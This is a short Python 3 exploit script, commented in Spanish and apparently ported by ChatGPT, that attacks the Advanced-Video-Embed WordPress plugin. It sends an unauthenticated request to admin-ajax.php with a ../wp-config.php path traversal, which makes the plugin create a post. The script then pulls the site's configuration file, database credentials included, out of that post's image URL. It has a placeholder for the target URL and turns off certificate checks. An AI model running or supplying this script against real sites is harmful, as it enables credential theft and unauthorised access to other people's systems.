#!/usr/bin/env python3

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Author: evait security GmbH (modificado a Python 3 por ChatGPT)
# Date: 04/01/2016

import random
import urllib.request
import re
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

url = "http://127.0.0.1/wordpress"  # ← Cambia esto por la URL del Wordpress objetivo

# Generar un ID aleatorio como string
randomID = int(random.random() * 100000000000000000)

# Hacer la primera petición al admin-ajax.php
exploit_url = f"{url}/wp-admin/admin-ajax.php?action=ave_publishPost&title={randomID}&short=rnd&term=rnd&thumb=../wp-config.php"
response = urllib.request.urlopen(exploit_url)
content = response.readlines()

# Extraer ID del post
for line in content:
    numbers = re.findall(rb'\d+', line)  # Buscar números en binario
    if numbers:
        post_id = int(numbers[-1]) // 10

# Hacer la segunda petición al post creado
post_url = f"{url}/?p={post_id}"
response = urllib.request.urlopen(post_url)
content = response.read().decode()  # Leer y decodificar a texto

# Buscar la URL de la imagen (que contiene el contenido del archivo descargado)
match = re.search(r'"(https?://.*?)"', content)
if match:
    file_url = match.group(1)
    file_content = urllib.request.urlopen(file_url).read().decode(errors='ignore')
    print(file_content)
else:
    print("[!] No se pudo encontrar la URL del archivo.")
